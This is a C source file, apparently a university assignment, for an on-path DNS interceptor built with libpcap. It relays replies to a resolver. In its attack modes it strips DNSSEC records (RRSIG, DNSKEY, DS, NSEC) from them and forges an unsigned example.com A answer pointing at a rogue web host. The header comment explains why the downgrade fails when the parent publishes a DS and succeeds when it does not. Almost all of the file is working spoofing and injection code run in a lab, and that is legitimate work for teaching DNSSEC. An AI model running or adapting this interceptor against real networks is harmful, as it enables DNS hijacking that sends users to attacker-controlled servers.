/*
 * CS6008 Assignment 2 — Phase 4: Signature Stripping & Downgrade
 * ---------------------------------------------------------------
 * On-path interceptor for the resolver subnet (172.16.2.100). The core-router
 * diverts all authoritative->resolver reply traffic (dst 172.16.2.10) to this
 * host as next-hop; kernel IP-forwarding is OFF, so THIS program is the only
 * thing that relays those frames onward. It re-injects every frame to the
 * resolver's real MAC (discovered by ARP at startup — nothing is hard-coded).
 *
 * Three modes:
 *   --relay       Transparent relay. Used for verification 4.2: the client
 *                 still gets the authentic, DNSSEC-validated answer.
 *
 *   --strip-runA  Full on-wire downgrade attempt against the Phase-3 hierarchy
 *                 (com DOES publish a DS for example.com). For every reply to
 *                 the resolver we:
 *                   (a) strip every example.com-scoped DNSSEC RR
 *                       (RRSIG, DNSKEY, DS, NSEC, NSEC3, NSEC3PARAM, CDS,
 *                        CDNSKEY) from all sections — this removes the DS (and
 *                        its RRSIG) from the com referral and the DNSKEY/RRSIG
 *                        from example.com's own answers; and
 *                   (b) replace the final example.com/A answer with a forged,
 *                       unsigned A pointing at rogue-web (172.16.1.30).
 *                 EXPECTED RESULT: the attack FAILS. The attacker cannot forge
 *                 com's signature over a "no-DS" proof, so the resolver can
 *                 neither validate nor prove-insecure the delegation; it
 *                 returns SERVFAIL (bogus). Downgrade resistance lives in the
 *                 signed DS / signed denial-of-DS held by the parent.
 *
 *   --strip-runB  Same strip-and-forge of the final example.com/A answer, but
 *                 the PARENT's records are relayed untouched. This mode is used
 *                 together with the Run-B deployment, in which com publishes NO
 *                 DS for example.com. There, com's own signed NSEC proves "no
 *                 DS" -> the resolver authenticates an INSECURE delegation ->
 *                 example.com's signatures are ignored -> the forged unsigned A
 *                 is accepted. EXPECTED RESULT: the client lands on rogue-web.
 *
 * Only C + libpcap are used (pcap_inject / pcap_sendpacket), as required.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <netpacket/packet.h>

#define MAX_PKT_SIZE 2048
#define TARGET_QNAME "example.com"
#define ROGUE_IP     "172.16.1.30"
#define RESOLVER_IP  "172.16.2.10"

/* DNS RR types we treat as "DNSSEC machinery" and strip in Run A. */
#define T_A          1
#define T_DS         43
#define T_RRSIG      46
#define T_NSEC       47
#define T_DNSKEY     48
#define T_NSEC3      50
#define T_NSEC3PARAM 51
#define T_CDS        59
#define T_CDNSKEY    60

typedef enum { MODE_RELAY, MODE_STRIP_RUNA, MODE_STRIP_RUNB } attack_mode_t;

static volatile sig_atomic_t keep_running = 1;
static pcap_t *handle = NULL;
static attack_mode_t g_mode = MODE_RELAY;

static char     g_dev[64] = "eth0";
static uint8_t  g_attacker_mac[6];
static uint8_t  g_resolver_mac[6];
static uint32_t g_attacker_ip_n;          /* this host's IPv4 on g_dev        */
static uint32_t g_resolver_ip_n;          /* 172.16.2.10                      */
static uint32_t g_rogue_ip_n;             /* 172.16.1.30                      */

static void sig_handler(int signum) {
    (void)signum;
    keep_running = 0;
    if (handle) pcap_breakloop(handle);
}

/* ---------- checksums ---------------------------------------------------- */

static uint16_t checksum(const void *buf, size_t len) {
    uint32_t sum = 0;
    const uint16_t *p = (const uint16_t *)buf;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len == 1) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

struct pseudo_hdr {
    uint32_t src, dst;
    uint8_t  zero, proto;
    uint16_t udp_len;
} __attribute__((packed));

static uint16_t udp_checksum(const struct iphdr *iph, const struct udphdr *udph,
                             const uint8_t *payload, size_t payload_len) {
    struct pseudo_hdr ph;
    ph.src = iph->saddr;
    ph.dst = iph->daddr;
    ph.zero = 0;
    ph.proto = IPPROTO_UDP;
    ph.udp_len = htons((uint16_t)(sizeof(struct udphdr) + payload_len));

    size_t total = sizeof(ph) + sizeof(struct udphdr) + payload_len;
    uint8_t *buf = calloc(1, total + 1);
    if (!buf) return 0;
    struct udphdr tmp = *udph;
    tmp.check = 0;
    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), &tmp, sizeof(tmp));
    memcpy(buf + sizeof(ph) + sizeof(tmp), payload, payload_len);
    uint16_t res = checksum(buf, total);
    free(buf);
    return res == 0 ? 0xFFFF : res;
}

/* ---------- DNS name parsing -------------------------------------------- */

/* Read a (possibly compressed) domain name starting at `off` into `out`
 * (lowercased, dot-separated, no trailing dot). Returns the offset of the byte
 * immediately AFTER the name as it appears at `off` (a compression pointer is 2
 * bytes). Returns -1 on malformation. `consumed_here` counts only the bytes of
 * the name in situ (so the caller can skip it), independent of any jump. */
static int read_name(const uint8_t *msg, size_t msg_len, size_t off,
                     char *out, size_t out_sz) {
    size_t o = 0;
    size_t i = off;
    int jumped = 0;
    int after = -1;          /* offset just past the in-situ name */
    int guard = 0;

    if (out && out_sz) out[0] = '\0';
    while (i < msg_len) {
        if (++guard > 128) return -1;            /* loop guard */
        uint8_t len = msg[i];
        if ((len & 0xC0) == 0xC0) {              /* compression pointer */
            if (i + 1 >= msg_len) return -1;
            if (!jumped) after = (int)(i + 2);
            size_t ptr = ((len & 0x3F) << 8) | msg[i + 1];
            if (ptr >= msg_len) return -1;
            i = ptr;
            jumped = 1;
            continue;
        }
        if (len == 0) {                          /* root label -> end */
            if (!jumped) after = (int)(i + 1);
            break;
        }
        if (len > 63 || i + 1 + len > msg_len) return -1;
        i++;
        for (uint8_t k = 0; k < len; k++) {
            if (out && o + 2 < out_sz) {
                char c = (char)msg[i + k];
                if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
                out[o++] = c;
            }
        }
        if (out && o + 1 < out_sz) out[o++] = '.';
        i += len;
    }
    if (out && out_sz) {
        if (o > 0 && out[o - 1] == '.') o--;     /* drop trailing dot */
        out[o] = '\0';
    }
    return after;
}

/* true if `name` equals "example.com" or ends with ".example.com" */
static int in_example_com(const char *name) {
    size_t n = strlen(name);
    const char *suf = TARGET_QNAME;              /* "example.com" */
    size_t sl = strlen(suf);
    if (n == sl && strcasecmp(name, suf) == 0) return 1;
    if (n > sl + 1 && name[n - sl - 1] == '.' &&
        strcasecmp(name + (n - sl), suf) == 0) return 1;
    return 0;
}

static int is_dnssec_type(uint16_t t) {
    switch (t) {
        case T_RRSIG: case T_DNSKEY: case T_DS:
        case T_NSEC: case T_NSEC3: case T_NSEC3PARAM:
        case T_CDS: case T_CDNSKEY:
            return 1;
        default: return 0;
    }
}

/* Skip a name in situ at `off`, return offset just past it, or -1. */
static int skip_name(const uint8_t *msg, size_t msg_len, size_t off) {
    return read_name(msg, msg_len, off, NULL, 0);
}

/* ---------- Run A: strip example.com-scoped DNSSEC RRs in place ---------- */

/* Rewrites `dns` (length *dns_len) removing every RR whose owner is inside
 * example.com and whose type is a DNSSEC type. Counts are fixed. The question
 * section and all non-matching RRs are preserved verbatim (including their
 * compression pointers, which only ever point backwards to the question/owner
 * that we keep). Returns 1 if the message was rewritten, 0 if unchanged,
 * -1 on a parse error (caller then relays untouched). */
static int strip_dnssec(uint8_t *dns, size_t *dns_len) {
    size_t len = *dns_len;
    if (len < 12) return -1;

    uint16_t qd = (dns[4] << 8) | dns[5];
    uint16_t counts[3] = {
        (uint16_t)((dns[6]  << 8) | dns[7]),     /* AN */
        (uint16_t)((dns[8]  << 8) | dns[9]),     /* NS */
        (uint16_t)((dns[10] << 8) | dns[11])     /* AR */
    };

    /* walk past questions */
    size_t p = 12;
    for (uint16_t i = 0; i < qd; i++) {
        int e = skip_name(dns, len, p);
        if (e < 0) return -1;
        p = (size_t)e + 4;                        /* qtype + qclass */
        if (p > len) return -1;
    }

    uint8_t out[MAX_PKT_SIZE];
    if (p > sizeof(out)) return -1;
    memcpy(out, dns, p);                          /* header + questions */
    size_t op = p;
    uint16_t new_counts[3] = {0, 0, 0};
    int removed = 0;

    for (int sec = 0; sec < 3; sec++) {
        for (uint16_t i = 0; i < counts[sec]; i++) {
            size_t rr_start = p;
            int e = skip_name(dns, len, p);
            if (e < 0) return -1;
            size_t q = (size_t)e;
            if (q + 10 > len) return -1;
            uint16_t type  = (dns[q] << 8) | dns[q + 1];
            uint16_t rdlen = (dns[q + 8] << 8) | dns[q + 9];
            size_t rr_end = q + 10 + rdlen;
            if (rr_end > len) return -1;

            char owner[256];
            if (read_name(dns, len, rr_start, owner, sizeof(owner)) < 0) return -1;

            int drop = (is_dnssec_type(type) && in_example_com(owner));
            if (drop) {
                removed = 1;
            } else {
                size_t sz = rr_end - rr_start;
                if (op + sz > sizeof(out)) return -1;
                memcpy(out + op, dns + rr_start, sz);
                op += sz;
                new_counts[sec]++;
            }
            p = rr_end;
        }
    }

    if (!removed) return 0;

    out[6]  = (uint8_t)(new_counts[0] >> 8); out[7]  = (uint8_t)(new_counts[0] & 0xFF);
    out[8]  = (uint8_t)(new_counts[1] >> 8); out[9]  = (uint8_t)(new_counts[1] & 0xFF);
    out[10] = (uint8_t)(new_counts[2] >> 8); out[11] = (uint8_t)(new_counts[2] & 0xFF);

    memcpy(dns, out, op);
    *dns_len = op;
    return 1;
}

/* ---------- forge an unsigned A answer for example.com ------------------- */

/* Build a fresh response = original header id + question, one unsigned A RR
 * pointing at rogue-web, no DNSSEC. Returns new DNS length, or -1. */
static int forge_a_answer(const uint8_t *dns, size_t dns_len, uint8_t *out) {
    if (dns_len < 12) return -1;

    /* locate end of the (single) question */
    int e = skip_name(dns, dns_len, 12);
    if (e < 0) return -1;
    size_t q_end = (size_t)e + 4;                 /* + qtype + qclass */
    if (q_end > dns_len) return -1;

    out[0] = dns[0]; out[1] = dns[1];             /* txid */
    out[2] = 0x81; out[3] = 0x80;                 /* QR, RD, RA; RCODE 0 */
    out[4] = dns[4]; out[5] = dns[5];             /* QDCOUNT (copy) */
    out[6] = 0x00; out[7] = 0x01;                 /* ANCOUNT = 1 */
    out[8] = 0x00; out[9] = 0x00;                 /* NSCOUNT = 0 */
    out[10] = 0x00; out[11] = 0x00;               /* ARCOUNT = 0 */

    size_t qlen = q_end - 12;
    memcpy(out + 12, dns + 12, qlen);
    size_t c = 12 + qlen;

    out[c++] = 0xC0; out[c++] = 0x0C;             /* name -> question */
    out[c++] = 0x00; out[c++] = T_A;              /* TYPE A */
    out[c++] = 0x00; out[c++] = 0x01;             /* CLASS IN */
    out[c++] = 0x00; out[c++] = 0x00;
    out[c++] = 0x01; out[c++] = 0x2C;             /* TTL 300 */
    out[c++] = 0x00; out[c++] = 0x04;             /* RDLENGTH 4 */
    memcpy(out + c, &g_rogue_ip_n, 4); c += 4;
    return (int)c;
}

/* ---------- emit a frame to the resolver (fix MACs + checksums) ---------- */

static void send_to_resolver(const uint8_t *eth_src_template,
                             struct iphdr *iph, struct udphdr *udph,
                             const uint8_t *dns, size_t dns_len) {
    (void)eth_src_template;
    uint8_t frame[MAX_PKT_SIZE];
    size_t l2 = sizeof(struct ether_header);
    size_t l3 = sizeof(struct iphdr);
    size_t l4 = sizeof(struct udphdr);
    if (l2 + l3 + l4 + dns_len > sizeof(frame)) return;

    struct ether_header *eth = (struct ether_header *)frame;
    memcpy(eth->ether_shost, g_attacker_mac, 6);
    memcpy(eth->ether_dhost, g_resolver_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    struct iphdr *oip = (struct iphdr *)(frame + l2);
    oip->ihl = 5; oip->version = 4; oip->tos = 0;
    oip->tot_len = htons((uint16_t)(l3 + l4 + dns_len));
    oip->id = iph->id;
    oip->frag_off = 0;
    oip->ttl = 64;
    oip->protocol = IPPROTO_UDP;
    oip->saddr = iph->saddr;                      /* keep authoritative src */
    oip->daddr = iph->daddr;                      /* resolver */
    oip->check = 0;
    oip->check = checksum(oip, l3);

    struct udphdr *oudp = (struct udphdr *)(frame + l2 + l3);
    oudp->source = udph->source;                  /* src port 53 */
    oudp->dest = udph->dest;                      /* resolver ephemeral */
    oudp->len = htons((uint16_t)(l4 + dns_len));
    oudp->check = 0;
    oudp->check = udp_checksum(oip, oudp, dns, dns_len);

    memcpy(frame + l2 + l3 + l4, dns, dns_len);
    pcap_sendpacket(handle, frame, l2 + l3 + l4 + dns_len);
}

/* ---------- main packet handler ----------------------------------------- */

static void packet_handler(u_char *user, const struct pcap_pkthdr *hdr, const u_char *pkt) {
    (void)user;
    size_t min = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + 12;
    if (hdr->caplen < min) return;

    struct ether_header *eth = (struct ether_header *)pkt;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;
    /* ignore frames we ourselves injected */
    if (memcmp(eth->ether_shost, g_attacker_mac, 6) == 0) return;

    struct iphdr *iph = (struct iphdr *)(pkt + sizeof(struct ether_header));
    if (iph->protocol != IPPROTO_UDP) return;
    size_t ip_hl = iph->ihl * 4;

    struct udphdr *udph = (struct udphdr *)((uint8_t *)iph + ip_hl);
    uint16_t sport = ntohs(udph->source);

    /* We only ever handle authoritative->resolver replies (diverted to us). */
    if (iph->daddr != g_resolver_ip_n || sport != 53) return;

    const uint8_t *dns = (const uint8_t *)udph + sizeof(struct udphdr);
    size_t udp_len = ntohs(udph->len);
    if (udp_len < sizeof(struct udphdr) + 12) return;
    size_t dns_len = udp_len - sizeof(struct udphdr);
    if (dns + dns_len > pkt + hdr->caplen) return;     /* truncated capture */

    uint16_t flags   = (dns[2] << 8) | dns[3];
    int is_response  = (flags & 0x8000) != 0;
    uint16_t qdcount = (dns[4] << 8) | dns[5];
    uint16_t ancount = (dns[6] << 8) | dns[7];

    char qname[256] = {0};
    uint16_t qtype = 0;
    if (qdcount > 0) {
        int e = read_name(dns, dns_len, 12, qname, sizeof(qname));
        if (e >= 0 && (size_t)e + 4 <= dns_len)
            qtype = (dns[e] << 8) | dns[e + 1];
    }

    int target = (strcasecmp(qname, TARGET_QNAME) == 0);

    /* --- final example.com/A answer: forge an unsigned A (both strip modes) */
    if (g_mode != MODE_RELAY && is_response && target &&
        qtype == T_A && ancount >= 1) {
        uint8_t forged[512];
        int fl = forge_a_answer(dns, dns_len, forged);
        if (fl > 0) {
            printf("[FORGE] example.com A (id 0x%02x%02x) -> %s  [%s]\n",
                   dns[0], dns[1], ROGUE_IP,
                   g_mode == MODE_STRIP_RUNA ? "runA" : "runB");
            fflush(stdout);
            send_to_resolver(pkt, iph, udph, forged, (size_t)fl);
            return;
        }
    }

    /* --- Run A only: strip example.com-scoped DNSSEC RRs from everything    */
    if (g_mode == MODE_STRIP_RUNA && is_response) {
        uint8_t buf[MAX_PKT_SIZE];
        if (dns_len <= sizeof(buf)) {
            memcpy(buf, dns, dns_len);
            size_t nlen = dns_len;
            int r = strip_dnssec(buf, &nlen);
            if (r == 1) {
                printf("[STRIP] removed example.com DNSSEC RRs from reply "
                       "(qname=%s qtype=%u) %zu->%zu bytes\n",
                       qname[0] ? qname : "<none>", qtype, dns_len, nlen);
                fflush(stdout);
                send_to_resolver(pkt, iph, udph, buf, nlen);
                return;
            }
            if (r < 0) {
                /* parse failure: fall through to transparent relay */
            }
        }
    }

    /* --- default: transparent relay (fix L2 + checksums, payload intact) -- */
    {
        uint8_t buf[MAX_PKT_SIZE];
        if (hdr->caplen > sizeof(buf)) return;
        memcpy(buf, pkt, hdr->caplen);
        struct ether_header *reth = (struct ether_header *)buf;
        memcpy(reth->ether_shost, g_attacker_mac, 6);
        memcpy(reth->ether_dhost, g_resolver_mac, 6);
        struct iphdr *rip = (struct iphdr *)(buf + sizeof(struct ether_header));
        struct udphdr *rudp = (struct udphdr *)((uint8_t *)rip + ip_hl);
        const uint8_t *rdns = (const uint8_t *)rudp + sizeof(struct udphdr);
        rip->check = 0;
        rip->check = checksum(rip, ip_hl);
        rudp->check = 0;
        rudp->check = udp_checksum(rip, rudp, rdns, dns_len);
        pcap_sendpacket(handle, buf, hdr->caplen);
    }
}

/* ---------- interface address helpers + ARP resolve --------------------- */

static int load_local_addrs(void) {
    struct ifaddrs *ifap = NULL, *ifa;
    int got_ip = 0, got_mac = 0;
    if (getifaddrs(&ifap) != 0) return -1;
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || strcmp(ifa->ifa_name, g_dev) != 0) continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            g_attacker_ip_n = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr.s_addr;
            got_ip = 1;
        } else if (ifa->ifa_addr->sa_family == AF_PACKET) {
            struct sockaddr_ll *ll = (struct sockaddr_ll *)ifa->ifa_addr;
            if (ll->sll_halen == 6) { memcpy(g_attacker_mac, ll->sll_addr, 6); got_mac = 1; }
        }
    }
    freeifaddrs(ifap);
    return (got_ip && got_mac) ? 0 : -1;
}

struct arp_pkt {
    struct ether_header eth;
    uint16_t htype, ptype;
    uint8_t  hlen, plen;
    uint16_t oper;
    uint8_t  sha[6]; uint8_t spa[4];
    uint8_t  tha[6]; uint8_t tpa[4];
} __attribute__((packed));

/* Resolve g_resolver_ip_n's MAC via one or more ARP requests. Returns 0 ok. */
static int arp_resolve_resolver(void) {
    for (int attempt = 0; attempt < 20 && keep_running; attempt++) {
        struct arp_pkt req;
        memset(&req, 0, sizeof(req));
        memset(req.eth.ether_dhost, 0xFF, 6);
        memcpy(req.eth.ether_shost, g_attacker_mac, 6);
        req.eth.ether_type = htons(ETHERTYPE_ARP);
        req.htype = htons(ARPHRD_ETHER);
        req.ptype = htons(ETHERTYPE_IP);
        req.hlen = 6; req.plen = 4;
        req.oper = htons(ARPOP_REQUEST);
        memcpy(req.sha, g_attacker_mac, 6);
        memcpy(req.spa, &g_attacker_ip_n, 4);
        memcpy(req.tpa, &g_resolver_ip_n, 4);
        pcap_sendpacket(handle, (const u_char *)&req, sizeof(req));

        /* listen briefly for the reply */
        time_t start = time(NULL);
        while (time(NULL) - start < 1 && keep_running) {
            struct pcap_pkthdr *h;
            const u_char *p;
            int rc = pcap_next_ex(handle, &h, &p);
            if (rc != 1) continue;
            if (h->caplen < sizeof(struct arp_pkt)) continue;
            const struct arp_pkt *rep = (const struct arp_pkt *)p;
            if (ntohs(rep->eth.ether_type) != ETHERTYPE_ARP) continue;
            if (ntohs(rep->oper) != ARPOP_REPLY) continue;
            if (memcmp(rep->spa, &g_resolver_ip_n, 4) != 0) continue;
            memcpy(g_resolver_mac, rep->sha, 6);
            return 0;
        }
    }
    return -1;
}

/* ---------- main --------------------------------------------------------- */

int main(int argc, char **argv) {
    const char *mode_arg = NULL;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--relay") == 0)       { g_mode = MODE_RELAY;      mode_arg = argv[i]; }
        else if (strcmp(argv[i], "--strip-runA") == 0) { g_mode = MODE_STRIP_RUNA; mode_arg = argv[i]; }
        else if (strcmp(argv[i], "--strip-runB") == 0) { g_mode = MODE_STRIP_RUNB; mode_arg = argv[i]; }
        else if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) { strncpy(g_dev, argv[++i], sizeof(g_dev) - 1); }
        else { fprintf(stderr, "unknown arg: %s\n", argv[i]); }
    }
    if (!mode_arg) {
        fprintf(stderr, "Usage: %s [--relay|--strip-runA|--strip-runB] [-i iface]\n", argv[0]);
        return 2;
    }

    inet_pton(AF_INET, ROGUE_IP, &g_rogue_ip_n);
    inet_pton(AF_INET, RESOLVER_IP, &g_resolver_ip_n);

    if (load_local_addrs() != 0) {
        fprintf(stderr, "could not read IPv4/MAC of %s\n", g_dev);
        return 1;
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(g_dev, MAX_PKT_SIZE, 1, 10, errbuf);
    if (!handle) { fprintf(stderr, "pcap_open_live: %s\n", errbuf); return 1; }

    char amac[18];
    snprintf(amac, sizeof(amac), "%02x:%02x:%02x:%02x:%02x:%02x",
             g_attacker_mac[0], g_attacker_mac[1], g_attacker_mac[2],
             g_attacker_mac[3], g_attacker_mac[4], g_attacker_mac[5]);
    printf("stripper: mode=%s dev=%s attacker=%s\n", mode_arg, g_dev, amac);
    fflush(stdout);

    /* discover the resolver's MAC (no hard-coding) */
    if (arp_resolve_resolver() != 0) {
        fprintf(stderr, "ARP resolution of %s failed; is the route diverted?\n", RESOLVER_IP);
        pcap_close(handle);
        return 1;
    }
    printf("stripper: resolver %s is at %02x:%02x:%02x:%02x:%02x:%02x\n",
           RESOLVER_IP, g_resolver_mac[0], g_resolver_mac[1], g_resolver_mac[2],
           g_resolver_mac[3], g_resolver_mac[4], g_resolver_mac[5]);
    fflush(stdout);

    /* capture only the diverted replies: udp/53 responses toward the resolver */
    struct bpf_program fp;
    if (pcap_compile(handle, &fp, "udp and src port 53 and dst host " RESOLVER_IP,
                     1, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "pcap_compile: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return 1;
    }
    pcap_setfilter(handle, &fp);

    printf("stripper: running\n");
    fflush(stdout);
    pcap_loop(handle, -1, packet_handler, NULL);

    pcap_freecode(&fp);
    pcap_close(handle);
    return 0;
}
